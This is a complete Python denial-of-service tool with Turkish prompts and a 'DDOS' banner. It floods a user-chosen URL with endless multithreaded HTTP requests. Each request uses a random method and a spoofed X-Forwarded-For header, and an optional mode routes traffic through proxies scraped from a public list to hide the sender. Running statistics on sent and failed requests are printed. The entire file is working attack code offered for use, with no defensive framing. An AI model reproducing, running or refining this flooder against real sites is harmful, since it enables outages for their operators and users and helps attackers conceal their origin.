import threading
import requests
import random
import time
import os
import re

# --- RENKLER (ANSI) ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

# --- İSTATİSTİKLER ---
stats = {"sent": 0, "success": 0, "fail": 0}
proxies_list = []
methods = ["GET", "POST", "HEAD", "PUT", "DELETE"]

def fetch_proxies():
    """Otomatik proxy çekici"""
    print(f"{BLUE}[*] Proxyler internetten toplanıyor...{RESET}")
    url = "https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000"
    try:
        r = requests.get(url, timeout=8)
        found = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', r.text)
        return list(set(found))
    except:
        return []

def attack(url, mode, use_proxy, delay):
    while True:
        current_method = random.choice(methods) if mode == "ALL" else mode
        headers = {
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }

        proxy_dict = None
        p_info = "Local"
        if use_proxy and proxies_list:
            p_addr = random.choice(proxies_list)
            proxy_dict = {"http": f"http://{p_addr}", "https": f"http://{p_addr}"}
            p_info = p_addr

        try:
            if delay > 0: time.sleep(delay)
            
            start_time = time.time()
            r = requests.request(method=current_method, url=url, headers=headers, proxies=proxy_dict, timeout=4)
            end_time = time.time()
            
            stats["sent"] += 1
            if r.status_code < 400:
                stats["success"] += 1
                print(f"{GREEN}[{current_method}] {p_info} -> {r.status_code} OK ({round(end_time-start_time, 2)}s){RESET}")
            else:
                stats["fail"] += 1
                print(f"{YELLOW}[{current_method}] {p_info} -> {r.status_code} WARN{RESET}")
        except:
            stats["sent"] += 1
            stats["fail"] += 1
            # Bazı hataları çok sık basmaması için opsiyonel: print(f"{RED}[ERR] {p_info} -> Bağlantı koptu!{RESET}")

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{BOLD}{RED}")
    print("  ██████╗ ██████╗  ██████╗ ███████╗")
    print("  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝")
    print("  ██║  ██║██║  ██║██║   ██║███████╗")
    print("  ██║  ██║██║  ██║██║   ██║╚════██║")
    print("  ██████╔╝██████╔╝╚██████╔╝███████║")
    print("  ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝")
    print("Made by Akıncı AIC")
    print(f"{RESET}")

    # Kullanıcı Girişleri
    target = input(f"{CYAN}Hedef URL (örn: http://test.com): {RESET}")
    print(f"\n{WHITE}[1] Normal (Hızlı) | [2] Proxy (Gizli){RESET}")
    choice = input(f"{CYAN}Seçim: {RESET}")
    
    method_choice = input(f"{CYAN}Metot (GET/POST/ALL): {RESET}").upper()
    threads = int(input(f"{CYAN}Thread Sayısı: {RESET}"))
    delay = float(input(f"{CYAN}Gecikme (sn) (Hız için 0): {RESET}"))

    global proxies_list
    use_proxy = False
    if choice == "2":
        proxies_list = fetch_proxies()
        if proxies_list:
            use_proxy = True
            print(f"{GREEN}[+] {len(proxies_list)} proxy aktif edildi!{RESET}")
        else:
            print(f"{RED}[!] Proxy çekilemedi, yerel IP ile devam ediliyor.{RESET}")

    print(f"\n{BOLD}{YELLOW}[*] Saldırı/Test başlatıldı... Durdurmak için CTRL+C{RESET}\n")
    time.sleep(1)

    # İşçileri Başlat
    for _ in range(threads):
        t = threading.Thread(target=attack, args=(target, method_choice, use_proxy, delay))
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n{BOLD}{RED}--- TEST ÖZETİ ---")
        print(f"{CYAN}Toplam Gönderilen: {stats['sent']}")
        print(f"{GREEN}Başarılı Yanıt  : {stats['success']}")
        print(f"{RED}Hatalı/Zaman Aşımı: {stats['fail']}{RESET}")

if __name__ == "__main__":
    main()
